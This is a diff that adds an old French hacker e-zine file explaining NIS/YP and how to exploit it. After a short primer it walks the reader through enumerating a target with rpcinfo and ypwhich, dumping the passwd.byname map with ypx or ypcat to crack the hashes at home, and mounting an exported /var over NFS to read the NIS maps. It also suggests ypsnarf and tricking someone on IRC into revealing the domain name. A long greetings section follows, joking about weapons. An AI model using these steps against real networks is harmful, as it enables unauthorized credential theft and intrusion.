@@ -1,0 +1,197 @@
+                     N     N       ii        ssssss
+                     N N   N       ii        s
+                     N  N  N       ii        sssss
+                     N   N N       ii            ss
+                     N     N       ii        sssss
+
+
+| Edito: j'ecris se petit file pour me faire pardonner d'une faute enorme
+| qui s'est glisse dans ma petite Hackers Note :( Mais bon, pour me faire
+| pardonner je vais vous pondre un bon petit file qui sera promis-jure sans
+| fautes, enfin presque :)
+
+** 1: C'est quoi NIS et a quoi ca sert ?
+ NIS est un service qui permet d'administrer sur une seule machine les
+principales base de donnees systeme d'un reseau UNIX. Les fichiers
+concernes sont /etc/passwd, /etc/groups, /etc/hosts, /etc/networks, etc etc.
+Maintenant, on va voir a quoi ca peut nous servir NIS (du point de vue d'un
+admin.). Imagine que tu as plusieurs accounts sur des machines. Le jour ou tu
+veux changer ton password, hehe!, tu vas devoir changer ton password sur
+chaque machine. Si tu as plus de 200 accounts, c'est poa evident! :( Par
+contre, avec NIS, tu as juste a changer une seule fois ton password, et c'est
+tout. Ensuite toutes les machines sont au courant de ce changement.
+
+ Voyons d'un peut plus pres le mecanisme ki peut realiser ce MiRaCLE ;).
+ Imaginons que la machine qui centralise NIS s'appelle BIBI. Toi, tu te
+connectes sur la machine LINDA. D'abord, on te demande ton login et mot de
+passe. Ensuite, le programme qui gere le login regarde si tu as un account en
+local. Pour cela elle regarde le /etc/passwd. (voici comment il se presente
+sur la machine LINDA)
+
+ #/etc/passwd
+ root:VcDtfTeRTTt45:0:1:bibi le boss:/:/bin/sh
+ bin:*:1:1::/usr/local/bin/noshell
+ gege:100:501: gege le mec ki bosse k'en local:/home/gege:/bin/sh
+ +foo
+
+ La, on voit que l'user foo (au fait, c'est *vous* ;)) n'est pas gere en local
+(c'est le +username qui indique une entree NIS). Donc, le programme de login
+va faire une requete NIS a la machine BIBI. Pour cela, il regarde le nom de
+domaine NIS sur lequel il doit effectuer sa recherche, pour consulter les
+cartes NIS necessaires a la verification de l'user. (note: les noms de
+domaines NIS sont differents du nom de domaine de la becane, et il peut avoir
+plusieurs noms de domaine sur une machine).
+
+ Voici en gros a koi resemble une carte NIS...
+
+ ---------------------------------------------------------------------------
+ X-OR:F45SdGhhIk.:234:789:X-or le chevalier de l'espace:/home/x-or:/bin/sh
+ foo:3DKF9kApLWx:233:253:foo le hacker fou:/home/foo:/bin/sh
+ ---------------------------------------------------------------------------
+
+ Donc voila, notre programme de login a plus qu'a lire l'entree pour l'user
+foo et le tour est joue :).
+
+ Vous avez tout compris? NON! Ben alors achetez un gros bouquin sur UNIX ;p
+Vous allez me dire: "C'est bien bOOOooOOOoOOOoO tout ca mais moi, petit hacker
+que je suis, a quoi ca va pouvoir bien de me servir ?" :)
+
+ Imagine... Tu fais un rpcinfo sur www.victim.com
+
+  % rpcinfo -p www.victim.com              [NDR: le `%' n'est pas a taper!]
+   program  vers  proto  port
+   100004      2    tcp   673  ypserv
+   100005      1    udp   721  mountd
+   100003      2    udp  2049  nfs
+   100026      1    udp   733  bootparam
+
+ Victoire! il y'a ypserv donc forcement il y a NIS et encore re-victoire car
+il y a bootparam. Maintenant, il ne reste plus qu'a trouver le nom de domaine.
+Pour tester au pif un nom, on fait un ypwhich...
+
+  % ypwhich -d victim  www.victim.com
+   bibi.victim.com
+
+ On sait que c'est la machine BIBI qui gere le NIS et on sait en plus que
+victim est bien le nom de domaine du NIS. Donc, ensuite, ce qui nous interesse
+c'est la carte passwd.byname (c'est le fichier /etc/passwd en gros ;). Pour
+cela, il y a DEUX facons: 1/ si on est a l'exterieur du domaine, on utilise un
+programme appelle ypx (ses sources se trouvent partout sur le web) (remarque:
+on peut utiliser ypcat mais pour cela il faut modifier le fichier de
+configuration /etc/yp.conf (sous Linux). Si vous voulez plus de details,
+demandez-moi).
+
+ Donc avec ypx on tape ceci:
+  % ypx -d bibi.victim.com victim -m passwd.byname
+
+ Et hop!, la on a la carte NIS passwd.byname qui s'affiche. Y'a plus qu'a
+sauver ca et a le cracker trankillllooouuuu chez soi :)
+
+ Autre cas, si vous etes a la FAC :)
+ Faites ca...
+
+  fac% domainname
+   etudiant
+  fac%
+
+ Vous savez que le domaine NIS de chez vous c'est "etudiant". Si vous voulez
+voir la carte NIS faites ca:
+
+  fac% ypcat passwd
+
+ Et voila, tous les passwords que gere le domaine NIS "etudiant". Pour savoir
+ensuite les autres noms de domaine NIS si vous avez acces a la machine qui
+gere le NIS justement, faites un tour dans /var/yp/ faite un "ls" et vous
+verrez ca:
+
+  fac% ls
+   etudiant/
+   dolores/
+   xfucker/
+
+ Vous connaissez maintenant les autres nom de domaine NIS (dolores, xfucker).
+Ensuite, pour voir les cartes NIS de ses domaines faites ca:
+
+  fac% ypcat -d dolores passwd
+
+ Et re-hop!, vous avez tous les passwd geres par le domaine NIS dolores qui
+s'affichent.
+
+ "Heuuuu, je connais pas le nom de domaine :( !"
+ Vous avez pas trouve le nom de domaine NIS ? C'est pas grave ca va s'
+arranger :), par un petit
+
+  xhacker% showmount -e www.victim.com
+   ...
+   /var (everyone)
+   ...
+
+ Le repertoire /var est exporte pour tous. Montez-le...
+
+   % mount -t nfs www.victim.com:/var /mnt
+
+ Ensuite, allez voir dans /mnt/yp et puis je vous laisse le soin de deviner la
+suite :)
+
+ Si /var est pas exporte, il reste toujours bootparam. Pour cela utilisez
+ypsnarf (dont les sources sont disponible partout).
+
+ Vous avez toujours pas trouve ? argh! Il vous reste le SE :) Attendez qu'un
+jour un mec du domaine vienne sur IRC puis amenez-le a executer domainname sur
+sa becanne :) est qu'il vous donne le resultat vlaaaa [NDR: ouais, faut quand
+meme avoir du bol pour que le mec passe sur l'IRC juste quand t'y es, ET en
+plus qu'il soit assez con :)]
+
+ Bon ben... C'est tout pour ce coup-ci.
+ Allezzzzzzzzzzzzzzzzzz BYEeeeeeeeeeeeeeeeeeeee
+
+
+ Pour les greetzzzzz, je salue: moi, mon chien, mon ordi486 (ki marche encore),
+kewl, Mikasoft, larsen, MOA, glou, SoRcery, SD4, pixel4, MORGAN, JFF, SCUD,
+HOD, DraPer, pegase, YoDaH, HotCoDe, V0X, MaNiTinx, HaPpY, phir, DOC_sedOv,
+VaEviCtis, made_bomb, [pixel], [fft], CREALIFE (au fait une copine te trouve
+beau gosse ;) le pire c ke c une bombe ;)) T_VOID (sans rancune :)), oCtAg0n
+(qui corrige mes putain de fotes), UNIX, les PABX, la nuit qui nous permet de
+faire des conneries sans se faire trop voir :p, le pied de biche, ma putain de
+haine contre les cons (hehe un grands carnage dans un sous-repartiteur y'a que
+ca de vrai ;), Marion (non je la rendrai poa :), shaKespears Sister ('tain c'
+est calllmmmeee), les MPEG ('tain c'est bien), laurence (on vous ecoute HACK
+RADIO rulezzzzz), puis a C@r0line (pardon stp stp stp stp stp stp je le
+referai plus plzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz)
+
+ Bon ca suffit ;), liv tyler, tia carrere, M110 A2, general dymacics F-16
+Fighting Falcon (qui me permet de m'echapper quand la DST vient frapper a ma
+porte :)), le missile sol-air SA-6 "GAINFUL" (qui me permet de detruire les
+helicos de la DST) :), le napalm, mon 11/43, ma 9mm REGINA, DIEU, SATAN (le
+log de farmer), l'OLP, le FLNC: Front de Liberation National des
+Communications, mes pieds qui marchent encore, ma tete qui est bien sur mes
+epaules, mes doigts, mes yeux ma cervelle, merde a celui qui lira :), bon je
+stoppe le delire (non ???) VIVE le PhE!, F-KAOS, DEFKOR Underground, MJ-13,
+NAG, ADN, HOD, etc etc, alors prets pour le mot de la fin ??
+
+ *FIN*
+
+ /ME regrette les betises ki il as pu dire pardon plzzzzzzzzz
+ /ME se demande pourquoi il mettrait pas sa photo sur le web (note de [FfT]:
+NON, PITIE:)
+ /ME se dit que les mecs seraient trop degoutes.
+ /ME hehe
+ /ME se casse
+ /AMSG BYEEEEEE
+
+             ############################
+            #############################
+           ##############################
+          $$$$$$$$$$$$$$$$$$$$$$$$$$$$###
+          $                          $###
+          $           CoD4           $###
+          $                          $###
+          $      MARION-KILLER'S     $##
+          $                          $#
+          $$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+ Pour ceux qui seraient cons, c'est une blague (non c'est vrai qu'y en a qui
+sont epais)
+
+ (traduit du CoD4 vers le francais moyen par hOtCodE... Idem pour les NDR :)
+
